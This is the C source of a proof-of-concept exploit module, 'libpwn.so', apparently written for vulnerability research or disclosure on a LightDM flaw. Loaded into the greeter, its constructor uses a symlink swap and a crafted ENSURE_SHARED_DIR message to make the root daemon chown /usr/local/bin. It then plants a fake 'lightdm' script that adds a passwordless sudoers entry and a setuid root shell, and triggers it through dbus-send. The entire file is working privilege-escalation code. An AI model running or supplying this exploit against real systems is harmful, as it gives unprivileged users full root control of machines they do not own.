/*
 * poc/libpwn.so - lightdm greeter module for a default Kali installation.
 *
 * The loader (a malicious XSETTINGS manager) makes the GTK greeter dlopen()
 * this object.  The constructor runs as the unprivileged lightdm user and:
 *
 *   1. replaces /var/lib/lightdm/data with a symlink to /usr/local;
 *   2. sends ENSURE_SHARED_DIR("bin") to the root daemon, which follows the
 *      symlink and chowns/chmods /usr/local/bin to bin:lightdm 0770;
 *   3. restores the original data directory;
 *   4. writes /usr/local/bin/lightdm and asks for a second xremote seat, so
 *      the root session child resolves the fake first on PATH.
 *
 * Configuration is read from /var/tmp/lightdm-poc.state, written by poc.sh.
 * The target user name is only used for the sudoers line.  Paths are fixed so
 * the unprivileged user cannot inject shell syntax through the state file.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define POC_STATE "/var/tmp/lightdm-poc.state"
#define POC_LOG   "/tmp/lightdm-poc.log"

#define DATA_DIR    "/var/lib/lightdm/data"
#define DATA_BACKUP "/var/lib/lightdm/data.poc-backup"
#define FAKE_PATH   "/usr/local/bin/lightdm"

static char target_user[64];
static unsigned long target_uid;
static unsigned long target_gid;

static void
plog (const char *fmt, ...)
{
    int fd = open (POC_LOG, O_WRONLY | O_CREAT | O_APPEND | O_NOFOLLOW, 0666);
    if (fd < 0)
        return;

    va_list ap;
    va_start (ap, fmt);
    vdprintf (fd, fmt, ap);
    va_end (ap);
    close (fd);
}

static void
put_be32 (unsigned char *p, unsigned int v)
{
    p[0] = (v >> 24) & 0xff;
    p[1] = (v >> 16) & 0xff;
    p[2] = (v >> 8) & 0xff;
    p[3] = v & 0xff;
}

static int
read_state (void)
{
    int fd = open (POC_STATE, O_RDONLY | O_NOFOLLOW);
    if (fd < 0)
    {
        plog ("cannot open %s: %s\n", POC_STATE, strerror (errno));
        return 0;
    }

    FILE *f = fdopen (fd, "r");
    if (!f)
    {
        close (fd);
        plog ("fdopen state failed: %s\n", strerror (errno));
        return 0;
    }

    char line[256];
    while (fgets (line, sizeof (line), f))
    {
        line[strcspn (line, "\r\n")] = '\0';

        if (strncmp (line, "USER=", 5) == 0)
        {
            if (strlen (line + 5) >= sizeof (target_user))
            {
                plog ("state username too long\n");
                fclose (f);
                return 0;
            }
            memcpy (target_user, line + 5, strlen (line + 5) + 1);
        }
        else if (strncmp (line, "UID=", 4) == 0)
            target_uid = strtoul (line + 4, NULL, 10);
        else if (strncmp (line, "GID=", 4) == 0)
            target_gid = strtoul (line + 4, NULL, 10);
    }
    fclose (f);

    if (!target_user[0] || target_uid == 0 || target_uid == (unsigned long) -1)
    {
        plog ("incomplete state: user=%s uid=%lu gid=%lu\n",
              target_user, target_uid, target_gid);
        return 0;
    }

    struct passwd *pw = getpwnam (target_user);
    if (!pw || pw->pw_uid != (uid_t) target_uid || pw->pw_gid != (gid_t) target_gid)
    {
        plog ("state/user mismatch: user=%s uid=%lu gid=%lu\n",
              target_user, target_uid, target_gid);
        return 0;
    }

    return 1;
}

static int
send_ensure_shared_dir (const char *user)
{
    const char *s = getenv ("LIGHTDM_TO_SERVER_FD");
    int fd = s ? atoi (s) : -1;
    if (fd < 0)
    {
        plog ("no LIGHTDM_TO_SERVER_FD; cannot send ENSURE_SHARED_DIR\n");
        return 0;
    }

    unsigned char msg[8 + 4 + 64];
    size_t ulen = strlen (user);
    if (ulen > 63)
    {
        plog ("username too long\n");
        return 0;
    }

    put_be32 (msg + 0, 8);             /* GREETER_MESSAGE_ENSURE_SHARED_DIR */
    put_be32 (msg + 4, 4 + ulen);      /* payload length */
    put_be32 (msg + 8, ulen);          /* string length */
    memcpy (msg + 12, user, ulen);

    ssize_t n = write (fd, msg, 12 + ulen);
    plog ("send_ensure fd=%d user=%s n=%zd errno=%d\n",
          fd, user, n, errno);
    return n == (ssize_t) (12 + ulen);
}

/* Return 1 if an existing data directory was renamed, 0 if none, -1 on error. */
static int
prepare_data_symlink (void)
{
    struct stat st;

    if (lstat (DATA_DIR, &st) == 0)
    {
        if (S_ISLNK (st.st_mode))
        {
            if (unlink (DATA_DIR) < 0)
            {
                plog ("unlink old data symlink failed: %s\n", strerror (errno));
                return -1;
            }
            return 0;
        }

        if (!S_ISDIR (st.st_mode))
        {
            plog ("%s is not a directory; refusing to replace it\n", DATA_DIR);
            return -1;
        }

        if (rename (DATA_DIR, DATA_BACKUP) < 0)
        {
            plog ("rename data -> backup failed: %s\n", strerror (errno));
            return -1;
        }
        return 1;
    }

    if (errno != ENOENT)
    {
        plog ("lstat %s failed: %s\n", DATA_DIR, strerror (errno));
        return -1;
    }

    return 0;
}

static void
restore_data (int had_data)
{
    struct stat st;

    if (lstat (DATA_DIR, &st) == 0 && S_ISLNK (st.st_mode))
    {
        if (unlink (DATA_DIR) < 0)
            plog ("could not remove data symlink: %s\n", strerror (errno));
    }

    if (had_data)
    {
        if (rename (DATA_BACKUP, DATA_DIR) < 0)
            plog ("could not restore data backup: %s\n", strerror (errno));
        else
            plog ("restored %s\n", DATA_DIR);
    }
}

static int
display_number (void)
{
    const char *dpy = getenv ("DISPLAY");
    if (!dpy)
        return 99;

    const char *colon = strchr (dpy, ':');
    if (!colon)
        return 99;

    char *end = NULL;
    long n = strtol (colon + 1, &end, 10);
    if (end == colon + 1 || n <= 0 || n > 65535)
        return 99;
    return (int) n;
}

static void
write_fake (void)
{
    char rootsh[128];
    char evidence[128];
    char sudoers[128];

    snprintf (rootsh, sizeof (rootsh), "/var/tmp/poc-rootsh-%lu", target_uid);
    snprintf (evidence, sizeof (evidence), "/var/tmp/poc-root-%lu", target_uid);
    snprintf (sudoers, sizeof (sudoers), "/etc/sudoers.d/poc-%lu", target_uid);

    int fd = open (FAKE_PATH, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW, 0755);
    if (fd < 0)
    {
        plog ("open fake lightdm failed: %s\n", strerror (errno));
        return;
    }

    dprintf (fd,
             "#!/bin/sh\n"
             "# POC2\n"
             "id > %s\n"
             "echo '%s ALL=(ALL:ALL) NOPASSWD: ALL' > %s\n"
             "chmod 0440 %s\n"
             "cp /bin/sh %s\n"
             "chown root:%lu %s\n"
             "chmod 4750 %s\n",
             evidence,
             target_user,
             sudoers, sudoers,
             rootsh, target_gid, rootsh, rootsh);
    close (fd);

    if (chmod (FAKE_PATH, 0755) < 0)
        plog ("chmod fake lightdm failed: %s\n", strerror (errno));
    else
        plog ("fake lightdm planted; target=%s rootsh=%s\n",
              target_user, rootsh);
}

static void
trigger_second_seat (void)
{
    int dpy = display_number ();
    char cmd[512];

    snprintf (cmd, sizeof (cmd),
              "dbus-send --system --print-reply "
              "--dest=org.freedesktop.DisplayManager "
              "/org/freedesktop/DisplayManager "
              "org.freedesktop.DisplayManager.AddLocalXSeat int32:%d "
              ">/tmp/poc.dbus 2>&1", dpy);
    int rc = system (cmd);
    plog ("second AddLocalXSeat display=:%d rc=%d\n", dpy, rc);
}

__attribute__((constructor))
static void
pwn (void)
{
    if (!read_state ())
        return;

    plog ("libpwn loaded pid=%d uid=%d gid=%d target=%s/%lu/%lu\n",
          getpid (), getuid (), getgid (), target_user, target_uid, target_gid);

    /* Let the greeter finish its startup before replacing its data root. */
    sleep (1);

    int had_data = prepare_data_symlink ();
    if (had_data < 0)
        return;

    if (symlink ("/usr/local", DATA_DIR) < 0)
    {
        plog ("symlink data -> /usr/local failed: %s\n", strerror (errno));
        restore_data (had_data);
        return;
    }
    plog ("symlink data -> /usr/local\n");

    if (!send_ensure_shared_dir ("bin"))
    {
        restore_data (had_data);
        return;
    }

    /* The root handler runs synchronously in practice, but wait briefly for
     * the chown to become visible before restoring the data path. */
    struct stat lb;
    for (int i = 0; i < 30; i++)
    {
        if (stat ("/usr/local/bin", &lb) == 0 &&
            lb.st_gid == getgid () &&
            (lb.st_mode & 0777) == 0770)
            break;
        usleep (100000);
    }
    if (stat ("/usr/local/bin", &lb) == 0)
        plog ("/usr/local/bin mode=%o uid=%d gid=%d\n",
              lb.st_mode & 07777, lb.st_uid, lb.st_gid);

    restore_data (had_data);

    write_fake ();
    trigger_second_seat ();
}
